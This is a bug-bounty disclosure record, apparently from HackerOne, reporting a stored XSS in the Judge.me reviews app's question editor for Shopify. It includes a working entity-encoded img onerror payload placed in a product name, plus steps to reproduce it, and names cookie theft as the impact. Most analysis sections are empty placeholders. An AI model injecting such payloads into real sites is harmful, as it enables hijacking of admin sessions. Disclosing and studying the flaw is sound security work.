# Stored XSS in Question edit from product name

## Metadata
- **Source:** HackerOne
- **Report:** 1416672 | https://hackerone.com/reports/1416672
- **Submitted:** 2021-12-04
- **Reporter:** chupa__chups
- **Program:** Unknown
- **Bounty:** $500
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Stored
- **CVEs:** None
- **Category:** web-api

## Summary
Hi @judgeme!

Step to reproduce:

1. Log in to your shopify account and create product with name `">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`
2. Go to our store and write question to our product with name `">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi @judgeme!

Step to reproduce:

1. Log in to your shopify account and create product with name `">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`
2. Go to our store and write question to our product with name `">&#60;img src=x onerror=prompt(&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#100;&#111;&#109;&#97;&#105;&#110;)>`
3. Then go to Shopify admin/Judge.me Product Reviews/Questions and edit question. XSS triage

{F1533755}


POC video:

{F1533757}

## Impact

Cookie stealer

</details>

---
*Analysed by Claude on 2026-05-24*
